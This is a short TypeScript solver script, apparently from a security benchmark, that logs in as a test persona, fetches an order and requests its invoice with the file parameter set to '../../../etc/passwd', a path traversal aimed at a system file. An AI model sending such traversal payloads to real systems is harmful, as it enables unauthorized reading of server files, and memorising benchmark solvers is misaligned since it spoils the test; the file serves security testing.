// Download an "invoice" whose document name walks out of the store export folder to a system file.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface Order { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const res = await ctx.fetch(buildPath(ctx.plan, 'listOrders'), { method: 'GET' })
  const data = (await res.json().catch(() => ({}))) as { orders?: Order[] }
  const order = data.orders?.[0]
  if (!order) return
  const field = ctx.plan.params['invoiceFile'] ?? 'file'
  const escape = '../../../etc/passwd'
  const path = `${buildPath(ctx.plan, 'getInvoice', { orderId: order.external_id })}?${field}=${encodeURIComponent(escape)}`
  await ctx.fetch(path, { method: 'GET' })
}
